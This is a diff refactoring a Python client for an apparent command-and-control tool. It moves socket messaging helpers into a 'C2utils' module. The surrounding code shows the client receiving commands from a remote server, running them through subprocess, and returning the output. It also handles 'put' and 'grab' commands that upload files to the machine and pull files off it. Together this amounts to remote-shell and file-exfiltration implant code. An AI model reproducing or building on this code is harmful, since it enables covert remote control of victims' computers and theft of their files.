@@ -5,7 +5,7 @@ import subprocess
 import pathlib
 import tqdm
 import time
-import C2utils
+from C2utils import snd_msg, get_msg, snd_file, get_file
 
 r = open("../port", 'r')
 port = int(r.readline())
@@ -34,22 +34,6 @@ def execute_command(conn, cmd_str):
     stdoutput = (proc.stdout.read() + proc.stderr.read()).decode()
     snd_msg(conn, stdoutput)
 
-def snd_msg(conn, msg):
-    message = msg.encode(FORMAT)
-    length = str(len(message)).encode(FORMAT)
-    length += b' ' * (HEADER - len(length))
-    conn.send(length)
-    conn.send(message)
-
-def recieve_msg(conn):
-    msg_length = conn.recv(HEADER).decode(FORMAT)
-    if msg_length:
-        msg_length = int(msg_length)
-        msg = conn.recv(msg_length).decode(FORMAT)
-        return msg
-    else:
-        return ""
-
 def listen_to_server(conn):
     print(f"Connected to {SERVER}")
     connected = True
@@ -73,7 +57,7 @@ def listen_to_server(conn):
             elif msg[:3] == "put":
                 # receive the file infos
                 # receive using client socket, not server socket
-                received = recieve_msg(client)
+                received = get_msg(client)
                 filename, filesize = received.split(SEPARATOR)
                 print(f'filename: {filename}, fsize: {filesize}')
                 # remove absolute path if there is
@@ -104,7 +88,7 @@ def listen_to_server(conn):
                 f.close()
             
             elif msg[:4] == "grab":
-                filename = recieve_msg(client)
+                filename = get_msg(client)
                 print(f'Filename: {filename}')
 
                 try:
